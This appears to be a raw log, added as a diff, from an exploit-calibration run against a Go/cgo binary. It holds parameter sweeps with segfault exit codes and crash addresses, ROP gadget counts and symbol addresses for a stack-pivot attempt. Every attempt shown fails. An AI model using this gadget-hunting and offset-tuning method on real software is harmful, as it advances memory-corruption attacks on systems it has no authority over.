+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 278, "dummy": 12} -> hits=0/2 exits=[139, 139] rips=['0x79c731731b96', '0x71401e82bb96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 278, "dummy": 13} -> hits=0/2 exits=[139, 139] rips=['0x74f9a4f2fb96', '0x7c0576932b96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 278, "dummy": 14} -> hits=0/2 exits=[139, 139] rips=['0x7047c0538b96', '0x77a945932b96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 278, "dummy": 15} -> hits=0/2 exits=[139, 139] rips=['0x79d97962ab96', '0x726e0222db96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 234, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x7f1ab4937b96', '0x7901b5735b96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 234, "dummy": 1} -> hits=0/2 exits=[139, 139] rips=['0x783f63d32b96', '0x70280212fb96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 234, "dummy": 2} -> hits=0/2 exits=[139, 139] rips=['0x79aff2b2fb96', '0x76e331b35b96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 234, "dummy": 3} -> hits=0/2 exits=[139, 139] rips=['0x718a1924ab96', '0x7d2bb692fb96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 234, "dummy": 4} -> hits=0/2 exits=[139, 139] rips=['0x738c8662eb96', '0x79989fb32b96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 234, "dummy": 5} -> hits=0/2 exits=[139, 139] rips=['0x727ea1b30b96', '0x75455c00fb96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 234, "dummy": 6} -> hits=0/2 exits=[139, 139] rips=['0x7aaf7dc2db96', '0x7ceabcb38b96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 234, "dummy": 7} -> hits=0/2 exits=[139, 139] rips=['0x77bbf1936b96', '0x78f71cd32b96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 234, "dummy": 8} -> hits=0/2 exits=[139, 0] rips=['0x793889e3ab96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 234, "dummy": 9} -> hits=0/2 exits=[139, 139] rips=['0x704508337b96', '0x7e89cca2cb96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 234, "dummy": 10} -> hits=0/2 exits=[139, 139] rips=['0x72ab3bf35b96', '0x782e78132b96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 234, "dummy": 11} -> hits=0/2 exits=[139, 139] rips=['0x761e2e22bb96', '0x71a142d31b96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 234, "dummy": 12} -> hits=0/2 exits=[139, 139] rips=['0x7518b7332b96', '0x71b725f2fb96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 234, "dummy": 13} -> hits=0/2 exits=[139, 139] rips=['0x7aeaf3e2cb96', '0x70d312739b96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 234, "dummy": 14} -> hits=0/2 exits=[139, 139] rips=['0x767c59f35b96', '0x7585f5532b96']
+[recal] {"warmups": 4, "frame32": 0, "drops": 15, "offset": 234, "dummy": 15} -> hits=0/2 exits=[139, 139] rips=['0x7d997442bb96', '0x7538aa25bb96']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 278, "dummy": 0} -> hits=0/2 exits=[0, 139] rips=['0x735548e2eba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 278, "dummy": 1} -> hits=0/2 exits=[139, 0] rips=['0x7583df82bba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 278, "dummy": 2} -> hits=0/2 exits=[0, 139] rips=['0x78f4b6b39ba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 278, "dummy": 3} -> hits=0/2 exits=[139, 139] rips=['0x768cf0934ba6', '0x79fb6a538ba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 278, "dummy": 4} -> hits=0/2 exits=[139, 139] rips=['0x70afecf34ba6', '0x792ae833cba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 278, "dummy": 5} -> hits=0/2 exits=[139, 139] rips=['0x7f0c30d35ba6', '0x734564130ba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 278, "dummy": 6} -> hits=0/2 exits=[139, 139] rips=['0x754296134ba6', '0x72c7dc932ba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 278, "dummy": 7} -> hits=0/2 exits=[139, 139] rips=['0x70763a13bba6', '0x748141134ba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 278, "dummy": 8} -> hits=0/2 exits=[139, 139] rips=['0x7ad1b893aba6', '0x76c289339ba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 278, "dummy": 9} -> hits=0/2 exits=[139, 139] rips=['0x7c1404632ba6', '0x7d8c8702aba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 278, "dummy": 10} -> hits=0/2 exits=[0, 139] rips=['0x7769fdf39ba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 278, "dummy": 11} -> hits=0/2 exits=[139, 139] rips=['0x78cafbd32ba6', '0x79105942bba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 278, "dummy": 12} -> hits=0/2 exits=[139, 139] rips=['0x786b6bf39ba6', '0x72661ff33ba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 278, "dummy": 13} -> hits=0/2 exits=[139, 139] rips=['0x733396a4aba6', '0x79ca78031ba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 278, "dummy": 14} -> hits=0/2 exits=[139, 139] rips=['0x77ac8a335ba6', '0x7d746c32fba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 278, "dummy": 15} -> hits=0/2 exits=[139, 139] rips=['0x76bf2ab39ba6', '0x7a5169330ba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 234, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x729ac7130ba6', '0x7f5d1c826ba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 234, "dummy": 1} -> hits=0/2 exits=[139, 139] rips=['0x74407ce2eba6', '0x7d40b7b31ba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 234, "dummy": 2} -> hits=0/2 exits=[139, 139] rips=['0x78e049b30ba6', '0x7c187ba5bba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 234, "dummy": 3} -> hits=0/2 exits=[139, 139] rips=['0x714784e2bba6', '0x75fda6e2bba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 234, "dummy": 4} -> hits=0/2 exits=[139, 139] rips=['0x7e7eff22cba6', '0x728410b30ba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 234, "dummy": 5} -> hits=0/2 exits=[139, 139] rips=['0x70f7def3bba6', '0x79da29b33ba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 234, "dummy": 6} -> hits=0/2 exits=[139, 139] rips=['0x7520e573bba6', '0x7b3e1f02dba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 234, "dummy": 7} -> hits=0/2 exits=[139, 139] rips=['0x72d6a5335ba6', '0x7186c0b32ba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 234, "dummy": 8} -> hits=0/2 exits=[139, 139] rips=['0x7ce541a2dba6', '0x71a2c153aba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 234, "dummy": 9} -> hits=0/2 exits=[139, 139] rips=['0x768b4c535ba6', '0x7ab228a2aba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 234, "dummy": 10} -> hits=0/2 exits=[139, 139] rips=['0x7081d952fba6', '0x74e7fbb36ba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 234, "dummy": 11} -> hits=0/2 exits=[139, 139] rips=['0x72957443aba6', '0x7afe25d3cba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 234, "dummy": 12} -> hits=0/2 exits=[139, 139] rips=['0x78e104b34ba6', '0x7ee938d35ba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 234, "dummy": 13} -> hits=0/2 exits=[139, 139] rips=['0x7a44f2d35ba6', '0x7b71e6a2cba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 234, "dummy": 14} -> hits=0/2 exits=[139, 139] rips=['0x7d14df83aba6', '0x7b640bb30ba6']
+[recal] {"warmups": 4, "frame32": 1, "drops": 15, "offset": 234, "dummy": 15} -> hits=0/2 exits=[139, 139] rips=['0x7ec276134ba6', '0x711475f3bba6']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 278, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x77fb95b31bdb', '0x7a8d08539bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 278, "dummy": 1} -> hits=0/2 exits=[139, 139] rips=['0x767537f3abdb', '0x77f2ae332bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 278, "dummy": 2} -> hits=0/2 exits=[139, 139] rips=['0x75d95842bbdb', '0x7a6ebc72fbdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 278, "dummy": 3} -> hits=0/2 exits=[139, 139] rips=['0x71fc9db3bbdb', '0x7049d363abdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 278, "dummy": 4} -> hits=0/2 exits=[139, 139] rips=['0x7b2979532bdb', '0x73e485c3abdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 278, "dummy": 5} -> hits=0/2 exits=[139, 139] rips=['0x7fe30c93bbdb', '0x76ed16730bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 278, "dummy": 6} -> hits=0/2 exits=[139, 139] rips=['0x7fae1085bbdb', '0x7dd92cf33bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 278, "dummy": 7} -> hits=0/2 exits=[139, 139] rips=['0x7fc006136bdb', '0x7d7f60137bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 278, "dummy": 8} -> hits=0/2 exits=[139, 139] rips=['0x70fea0932bdb', '0x79711de28bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 278, "dummy": 9} -> hits=0/2 exits=[139, 139] rips=['0x7a16e1d39bdb', '0x7b81a4f3bbdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 278, "dummy": 10} -> hits=0/2 exits=[139, 139] rips=['0x7c022ce2dbdb', '0x74b4c9537bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 278, "dummy": 11} -> hits=0/2 exits=[139, 139] rips=['0x753b3773bbdb', '0x7f006ed38bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 278, "dummy": 12} -> hits=0/2 exits=[139, 139] rips=['0x7ccc2a534bdb', '0x7f303de2dbdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 278, "dummy": 13} -> hits=0/2 exits=[139, 139] rips=['0x70a259a2dbdb', '0x70d237f38bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 278, "dummy": 14} -> hits=0/2 exits=[139, 139] rips=['0x70b4fd537bdb', '0x7cb593026bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 278, "dummy": 15} -> hits=0/2 exits=[139, 139] rips=['0x744430e28bdb', '0x772c0c931bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 234, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x760aec043bdb', '0x717cbee2dbdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 234, "dummy": 1} -> hits=0/2 exits=[139, 139] rips=['0x7ba65f332bdb', '0x78e7f2130bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 234, "dummy": 2} -> hits=0/2 exits=[139, 139] rips=['0x7ad058332bdb', '0x7f3793139bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 234, "dummy": 3} -> hits=0/2 exits=[139, 139] rips=['0x71d721e2dbdb', '0x77178ed33bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 234, "dummy": 4} -> hits=0/2 exits=[139, 0] rips=['0x743166731bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 234, "dummy": 5} -> hits=0/2 exits=[139, 139] rips=['0x760403933bdb', '0x7fee02d32bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 234, "dummy": 6} -> hits=0/2 exits=[139, 139] rips=['0x756613d2fbdb', '0x73fb31934bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 234, "dummy": 7} -> hits=0/2 exits=[139, 139] rips=['0x737871e2bbdb', '0x7d55e853bbdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 234, "dummy": 8} -> hits=0/2 exits=[139, 139] rips=['0x77541612fbdb', '0x7d40b7d37bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 234, "dummy": 9} -> hits=0/2 exits=[139, 139] rips=['0x7f5516d38bdb', '0x727fa332fbdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 234, "dummy": 10} -> hits=0/2 exits=[139, 139] rips=['0x703a3913abdb', '0x77a072b31bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 234, "dummy": 11} -> hits=0/2 exits=[139, 139] rips=['0x77238353abdb', '0x770b94b36bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 234, "dummy": 12} -> hits=0/2 exits=[139, 139] rips=['0x76b229933bdb', '0x70077272fbdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 234, "dummy": 13} -> hits=0/2 exits=[139, 139] rips=['0x7547c0136bdb', '0x7737c9e28bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 234, "dummy": 14} -> hits=0/2 exits=[139, 139] rips=['0x7b7d4b62dbdb', '0x7d71dad39bdb']
+[recal] {"warmups": 4, "frame32": 2, "drops": 15, "offset": 234, "dummy": 15} -> hits=0/2 exits=[139, 139] rips=['0x7b2c14f34bdb', '0x7d322e539bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 278, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x77dc02137bdb', '0x75dc14335bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 278, "dummy": 1} -> hits=0/2 exits=[139, 139] rips=['0x7c35ca136bdb', '0x7fd789e29bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 278, "dummy": 2} -> hits=0/2 exits=[139, 139] rips=['0x70d01cd39bdb', '0x7a47fa734bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 278, "dummy": 3} -> hits=0/2 exits=[139, 139] rips=['0x7a093e626bdb', '0x7d7571631bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 278, "dummy": 4} -> hits=0/2 exits=[139, 139] rips=['0x70360592fbdb', '0x701b3c043bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 278, "dummy": 5} -> hits=0/2 exits=[139, 139] rips=['0x79bd72339bdb', '0x751e4cf34bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 278, "dummy": 6} -> hits=0/2 exits=[139, 139] rips=['0x770d3b932bdb', '0x7e215bf37bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 278, "dummy": 7} -> hits=0/2 exits=[139, 139] rips=['0x7442a4f3abdb', '0x751313535bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 278, "dummy": 8} -> hits=0/2 exits=[139, 139] rips=['0x71aecff3bbdb', '0x79af09936bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 278, "dummy": 9} -> hits=0/2 exits=[139, 139] rips=['0x7fc9f5533bdb', '0x7ac027537bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 278, "dummy": 10} -> hits=0/2 exits=[139, 139] rips=['0x792ea873abdb', '0x75bdfa139bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 278, "dummy": 11} -> hits=0/2 exits=[139, 139] rips=['0x71ba2622ebdb', '0x7e083882bbdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 278, "dummy": 12} -> hits=0/2 exits=[139, 139] rips=['0x71f247732bdb', '0x7a63f732fbdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 278, "dummy": 13} -> hits=0/2 exits=[139, 139] rips=['0x7b6a5bf34bdb', '0x761311933bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 278, "dummy": 14} -> hits=0/2 exits=[139, 139] rips=['0x7b6373335bdb', '0x78db54d35bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 278, "dummy": 15} -> hits=0/2 exits=[139, 139] rips=['0x7c7f71131bdb', '0x7fe723f33bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 234, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x76a02af32bdb', '0x77d289331bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 234, "dummy": 1} -> hits=0/2 exits=[0, 139] rips=['0x7f8ca9f37bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 234, "dummy": 2} -> hits=0/2 exits=[139, 139] rips=['0x733cc5d3abdb', '0x733d70b2fbdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 234, "dummy": 3} -> hits=0/2 exits=[139, 139] rips=['0x75cbb552fbdb', '0x74cb2c22dbdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 234, "dummy": 4} -> hits=0/2 exits=[139, 139] rips=['0x77e77862cbdb', '0x7a98b913abdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 234, "dummy": 5} -> hits=0/2 exits=[139, 139] rips=['0x78832a736bdb', '0x73b035138bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 234, "dummy": 6} -> hits=0/2 exits=[139, 139] rips=['0x7a9c60737bdb', '0x70b496f31bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 234, "dummy": 7} -> hits=0/2 exits=[139, 139] rips=['0x744287b34bdb', '0x750ed252fbdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 234, "dummy": 8} -> hits=0/2 exits=[139, 139] rips=['0x7691b1829bdb', '0x70792ce3dbdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 234, "dummy": 9} -> hits=0/2 exits=[139, 139] rips=['0x74ee44330bdb', '0x7f417e333bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 234, "dummy": 10} -> hits=0/2 exits=[139, 139] rips=['0x70444f939bdb', '0x7f3cadd34bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 234, "dummy": 11} -> hits=0/2 exits=[139, 139] rips=['0x7cab67b31bdb', '0x7a614b13bbdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 234, "dummy": 12} -> hits=0/2 exits=[139, 139] rips=['0x775a3c53bbdb', '0x7302e3730bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 234, "dummy": 13} -> hits=0/2 exits=[139, 139] rips=['0x70d58cd32bdb', '0x79d50ad34bdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 234, "dummy": 14} -> hits=0/2 exits=[139, 139] rips=['0x7423e0933bdb', '0x7530ce82cbdb']
+[recal] {"warmups": 4, "frame32": 3, "drops": 15, "offset": 234, "dummy": 15} -> hits=0/2 exits=[139, 139] rips=['0x763d9db32bdb', '0x71b036a2dbdb']
+[recal] best = null
+{"pivot_add_poprbp": 1, "pivot_add_ret": 58386, "pop_rax": 1, "guard_movups": 5, "guard_movq0": 3, "xor_xmm": 2805, "ud2": 5, "jmp_ind": 289, "call_ind": 10437}
+mint=f6a2c0 cgocb=470c60 g0=1c78700 pivot=f71a10 poprax=f71a20 guard=f71a30 ud2=f71a40
+  f6a2c0 t main.mintBridge
+  470c60 t runtime.cgocallback.abi0
+  4088a0 t runtime.cgocallbackg
+  473660 t runtime.cgocallbackg.abi0
+  408a40 t runtime.cgocallbackg1
+  469960 t runtime.cgocallbackg1.func1
+  408e20 t runtime.cgocallbackg1.func2
+  408dc0 t runtime.cgocallbackg1.func3
+ 1c78700 d runtime.g0
+ 1c78ce0 d runtime.m0
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 0, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 4, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 8, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 12, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 16, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 20, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 24, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 28, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 32, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 36, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 40, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 44, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 48, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 52, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 56, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 60, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 64, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 68, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 72, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 76, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 80, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 84, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 88, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 92, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 96, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 100, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 104, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 108, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 112, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 116, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 120, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 124, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 128, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 132, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 136, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 140, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 144, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 148, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 152, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 156, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 160, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 164, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 168, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 172, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 176, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 180, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 184, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 188, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 192, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 196, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 200, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 204, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 208, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 212, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 216, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 220, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 224, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 228, "dummy": 0} -> hits=0/2 exits=[0, 0] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 232, "dummy": 0} -> hits=0/2 exits=[139, 139] rips=['0x7e2b259f40e7', '0x72c403b3bbdb']
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 236, "dummy": 0} -> hits=0/2 exits=[1, 1] rips=[]
+[recal] {"warmups": 3, "frame32": 2, "drops": 15, "offset": 240, "dummy": 0} -> hits=0/2 exits=[139, 1] rips=['0x7b83ae934bdb']
